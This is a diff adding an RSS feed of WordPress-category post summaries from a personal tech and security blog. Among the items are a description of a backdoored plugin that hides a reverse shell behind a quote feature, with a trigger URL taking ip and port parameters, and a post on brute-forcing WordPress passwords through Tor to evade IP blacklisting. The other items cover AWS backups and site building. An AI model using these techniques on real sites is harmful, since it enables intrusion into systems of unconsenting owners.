@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>WordPress on Hi, I&#39;m Kyle</title>
+    <link>https://jovial-yonath-8d9e17.netlify.app/categories/wordpress/</link>
+    <description>Recent content in WordPress on Hi, I&#39;m Kyle</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 07 May 2019 01:33:19 +0000</lastBuildDate>
+    
+	<atom:link href="https://jovial-yonath-8d9e17.netlify.app/categories/wordpress/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Conwell Quotes v1.1</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/05/07/conwell-quotes-v1-1/</link>
+      <pubDate>Tue, 07 May 2019 01:33:19 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/05/07/conwell-quotes-v1-1/</guid>
+      <description>Conwell Quotes is a malicious WordPress plugin that hides a reverse shell in a backdoor behind legitimate plugin functionality. This is used for offensive security purposes.
+This is an update to version 1.1. This update now allows you to pass your ip and port as URL parameters rather than updating the error.php file prior to upload.
+http://example.com/wp-content/plugins/conwell/error.php?ip=XX.XXX.XXX.X&amp;amp;port=XXXX
+You can find the open source code on GitHub.
+Modeled after the Hello Dolly plugin which comes packaged on all new WordPress installations, Conwell Quotes displays a random quote on each page of the WordPress admin portal based on Conwell&amp;rsquo;s Acres of Diamonds (which is one of my favorite books).</description>
+    </item>
+    
+    <item>
+      <title>Moving a backup copy of WordPress over to AWS S3</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/09/28/moving-a-backup-copy-of-wordpress-over-to-aws-s3/</link>
+      <pubDate>Fri, 28 Sep 2018 22:39:13 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/09/28/moving-a-backup-copy-of-wordpress-over-to-aws-s3/</guid>
+      <description>Today I set out to make a complete backup of my WordPress blog, archive of the images and all. I set out to move the backup from my domain host directly into Amazon S3. Eventually, I plan to set a policy within S3 to move the files over to Amazon Glacier for even cheaper storage. We&amp;rsquo;ll start with the AWS portion, then the WordPress portion.
+AWS I created a new user, me, and then I created a new group, with a new policy&amp;ndash;essentially giving myself read, write, and credential creation permissions specifically for S3.</description>
+    </item>
+    
+    <item>
+      <title>Ghost on AWS - success!</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/09/23/ghost-on-aws-success/</link>
+      <pubDate>Sun, 23 Sep 2018 13:56:20 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/09/23/ghost-on-aws-success/</guid>
+      <description>This is the third and final part of my first foray into AWS. You can read part 1 and part 2. AWS is great. Getting access is secure and easy and you can&amp;rsquo;t beat free. AWS is incredibly quick at spinning up new instances and once connected over SSH it is extremely fast - it rivals the feel of a local installation - almost no latency for me.
+After getting Ubuntu installed, I spent the last few evenings attempting to install Ghost per these instructions.</description>
+    </item>
+    
+    <item>
+      <title>Brute Force WordPress Passwords with WPScan and Tor</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/18/brute-force-wordpress-passwords-with-wpscan-and-tor/</link>
+      <pubDate>Fri, 18 May 2018 00:54:54 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/18/brute-force-wordpress-passwords-with-wpscan-and-tor/</guid>
+      <description>Visit [Center City Security](https://centercitysecurity.com?utm_source=TechnicalAgain.com&amp;amp;utm_medium=https://technicalagain.com/2018/05/18/brute-force-wordpress-passwords-with-wpscan-and-tor/&amp;amp;utm_campaign=Technical Again Brute Force Wordpress Passwords with wpscan and tor&amp;amp;utm_content=header) for WordPress Penetration Testing and Security services.
+I took another crack, pun intended, at brute forcing my WordPress password using WPScan. Unlike when I tried it the other day, this time I used Tor and set up a SOCKs proxy to make use of a false IP address. My thinking was that my web host might black list my IP after a certain number of failed attempts, so by using Tor I could simply switch IP addresses once the blacklist went into effect.</description>
+    </item>
+    
+    <item>
+      <title>Scan Wordpress for Vulnerabilities with WPScan</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/12/scan-wordpress-for-vulnerabilities-with-wpscan/</link>
+      <pubDate>Sat, 12 May 2018 02:23:42 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/12/scan-wordpress-for-vulnerabilities-with-wpscan/</guid>
+      <description>I scanned my own Wordpress sites for vulnerabilites using a powerful command-line utility, WPScan. WPScan is a black box vulnerability scanner specifically for WordPress. It is a stark reminder why it is so important to minimize the number of plugins you use, delete the ones you have deactivated, and make sure you are keeping your software up-to-date. One simple little command: sudo wpscan example.com -u will list all the WordPress usernames, plugins installed, whether active or not, as well as all published vulnerabilities for the plugins, whether they have been fixed, as well as how to exploit them.</description>
+    </item>
+    
+    <item>
+      <title>Build an eCommerce Website with WooCommerce</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/05/12/build-an-ecommerce-website/</link>
+      <pubDate>Sat, 12 May 2018 01:11:17 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/05/12/build-an-ecommerce-website/</guid>
+      <description>I spent the last three weeks designing, building, testing, debugging and putting the finishing touches on my first eCommerce website, complete with a full shopping cart experience and product purchase workflow. One of my original project goals in launching this site was to learn how to take a payment online. This turned out to be relatively straight forward.
+I considered three possible approaches for this project: Wordpress with WooCommerce, Bootstrap with a shopping cart add-in, and Shopify.</description>
+    </item>
+    
+    <item>
+      <title>We landed here, on the internet, safely in one piece!</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2017/11/07/hello-world/</link>
+      <pubDate>Tue, 07 Nov 2017 01:58:27 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2017/11/07/hello-world/</guid>
+      <description>Our first project is in the can! I call this project &amp;ldquo;Make a Website, Start Following Through on Your Development Plan.&amp;rdquo;
+The first step was to find a domain name using Instant Domain Search. I&amp;rsquo;ve been using this site for at least 5 years and it remains the fastest and simplest way to find a domain.
+I then bought the cheapest hosting plan on Bluehost after hearing an advertisement on The Bill Simmons podcast.</description>
+    </item>
+    
+  </channel>
+</rss>
